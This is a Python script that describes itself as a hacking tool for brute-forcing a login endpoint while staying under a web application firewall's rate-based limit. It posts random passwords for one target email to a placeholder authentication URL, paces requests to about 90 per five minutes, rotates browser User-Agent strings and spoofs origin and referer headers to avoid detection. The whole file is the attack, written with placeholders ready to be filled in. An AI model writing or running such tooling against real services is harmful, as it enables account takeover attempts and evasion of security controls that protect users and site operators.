import requests
import string
import random
import math
import time

'''
hacking tool that can avoid WAF rate-based rule which has the minimum limitation of 100 requests in 5 minutes
'''

#  -----------------------------------------------------------------
# the number of requests per five minutes
# this is used to avoid WAF rate-based, so you MUST SET IT BELOW 100
# ------------------------------------------------------------------
ATTACK_COUNT_IN_FIVE_MINS = 90

# ---------------------------------------
# total requests this hacking tool sends
# ---------------------------------------
TOTAL_ATTACK_COUNT = 85

URL = "{auth_server_login_url_you_wanna_attack}"
USER_AGENTS = ['Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
    'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
    'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
    'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
    'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51']

EMAIL = '{your_email}'

def make_headers():
    headers = {"Content-Type":"application/json"}
    headers['User-Agent'] = random.choice(USER_AGENTS)
    headers['accept'] = 'application/json'
    headers['accept-encoding'] = 'gzip, deflate, br'
    headers['origin'] = '{service_url_that_requests_login_api_at_auth_server}'
    headers['referer'] = '{service_url_that_requests_login_api_at_auth_server}'
    return headers

def randomly_generate_password():
        return ''.join(random.choice(string.ascii_letters) for _ in range(random.randrange(7, 13)))

def login(i):
    json = {"email": EMAIL, "password": randomly_generate_password()}
    headers = make_headers()
    response = requests.post(URL, json=json, headers=headers)
    print("{} : {} {}".format(i,response.status_code, json))

INTERVAL = math.ceil(300 / ATTACK_COUNT_IN_FIVE_MINS)

for i in range(TOTAL_ATTACK_COUNT):
    time.sleep(INTERVAL)
    login(i)
